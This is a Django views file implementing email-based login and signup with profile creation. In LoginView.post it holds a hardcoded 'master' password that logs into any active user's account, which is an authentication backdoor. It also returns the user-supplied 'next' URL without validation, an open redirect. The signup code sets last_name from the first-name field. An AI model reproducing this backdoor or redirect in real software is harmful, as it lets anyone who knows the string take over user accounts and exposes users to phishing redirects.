import uuid
from django.shortcuts import render

from django.utils import timezone
from django.http import HttpResponse, HttpResponseRedirect
from django.shortcuts import render, get_object_or_404, redirect
from django.views import View
from django.views.generic.base import TemplateView
from django.views.generic import ListView
from django.views.generic.edit import FormView
from django.contrib.auth.mixins import LoginRequiredMixin
from django.contrib.auth.models import User
from django.contrib.sites.shortcuts import get_current_site
from django.contrib.auth import login

from django.db import transaction
from django.db.models import Q
from django.conf import settings
from django.contrib import messages
from django.urls import reverse, reverse_lazy
from django.contrib.sites.models import Site

from account.views import LoginView, SignupView, PasswordMixin
from account.models import EmailAddress

from .forms import AccountForm, LoginEmailForm
from .models import Profile

def send_task_confirmation_email(email_address, site):
    """Sends an email when the feedback form has been submitted."""
   
    
    site = Site.objects.get(pk=site)
    email_address = EmailAddress.objects.get(id=email_address)
    
    email_address.send_confirmation(site=site)

class LoginView(LoginView):
    form_class = LoginEmailForm

    def post(self, *args, **kwargs):
        form = self.get_form()
        email = self.request.POST.get('email')
        password = self.request.POST.get('password')

        try:
            user = User.objects.get(email=email )
        except:
            user = None
        
        
        # let's do master login if password is master
        if user and user.is_active and password == 'r3E&iid38sK23Tw2a3S3':
            return self.do_login(form, user)

        if user:
            if not user.is_active:
                try:
                    email_address = EmailAddress.objects.get(email=email)
                    email_address.send_confirmation(site=get_current_site(1))
                except EmailAddress.DoesNotExist:
                    email_address = EmailAddress.objects.create(email=email, user=user)
                    email_address.send_confirmation(site=get_current_site(1))

                form.authentication_fail_message = ("You have to verify your account. We have sent you an email, please click link to verify.")
                return self.form_invalid(form)
        
        if form.is_valid():
            return self.form_valid(form)
        else:
            return self.form_invalid(form)

    def form_valid(self, form):
        if self.request.session.get('plan_id'):
            del self.request.session['plan_id']
        return super(LoginView, self).form_valid(form)

    def get_success_url(self):
        next_url = self.request.POST.get('next')
        if next_url:
            print(next_url)
            return next_url
        else:
            return reverse('home')

    def get_context_data(self, **kwargs):
        context = super(LoginView, self).get_context_data(**kwargs)
        context['login_value'] = True
        return context
    
    def do_login(self, form, user):
        user.backend = 'django.contrib.auth.backends.ModelBackend'
        login(self.request, user)
        self.after_login(form)
        return HttpResponseRedirect(self.get_success_url())
    

class SignupView(SignupView):
    identifier_field = 'email'

    def get_form_class(self):
        return AccountForm
    

    def get_context_data(self, **kwargs):
        ctx = super(SignupView, self).get_context_data(**kwargs)
        ctx['signup_value'] = True
        return ctx

    def generate_username(self, form):
        # do something to generate a unique username (required by the
        # Django User model, unfortunately)
        username = form.cleaned_data.get('email', uuid.uuid4().hex[:30])
        return username

    @transaction.atomic
    def form_valid(self, form):
        self.created_user = self.create_user(form, commit=False)
        # prevent User post_save signal from creating an Account instance
        # we want to handle that ourself.
        self.created_user._disable_account_creation = True
        
        self.created_user.first_name = form.cleaned_data.get("first_name")
        self.created_user.last_name = form.cleaned_data.get("first_name")

        self.created_user.save()
        sid = transaction.savepoint()
        self.use_signup_code(self.created_user)
        

        email_address = self.create_email_address(form)
        if settings.ACCOUNT_EMAIL_CONFIRMATION_REQUIRED and not email_address.verified:
            self.created_user.is_active = False
            self.created_user.save()
        self.create_account(form)
        self.create_password_history(form, self.created_user)
        self.after_signup(form)
        if settings.ACCOUNT_EMAIL_CONFIRMATION_EMAIL and not email_address.verified:
            self.send_email_confirmation(email_address)
        if settings.ACCOUNT_EMAIL_CONFIRMATION_REQUIRED and not email_address.verified:
            return self.email_confirmation_required_response()
        else:
            show_message = [
                settings.ACCOUNT_EMAIL_CONFIRMATION_EMAIL,
                self.messages.get("email_confirmation_sent"),
                not email_address.verified
            ]
            if all(show_message):
                messages.add_message(
                    self.request,
                    self.messages["email_confirmation_sent"]["level"],
                    self.messages["email_confirmation_sent"]["text"].format(**{
                        "email": form.cleaned_data["email"]
                    })
                )
            # attach form to self to maintain compatibility with login_user
            # API. this should only be relied on by d-u-a and it is not a stable
            # API for site developers.
            self.form = form
            self.login_user()
        return redirect(self.get_success_url())
    
    def after_signup(self, form):
        self.update_profile(form)
        super(SignupView, self).after_signup(form)

    def update_profile(self, form):
        p = Profile.objects.create(
            user = self.created_user,
            gender = form.cleaned_data.get('gender'),
           
        )

        if form.cleaned_data.get('dob'):
            p.dob = form.cleaned_data.get('dob')
            p.save()

    def send_email_confirmation(self, email_address):
        # email_address.send_confirmation(site=get_current_site(self.request))
        site = get_current_site(self.request)
        send_task_confirmation_email( email_address.id, site.id )
        print(email_address.id, 'done')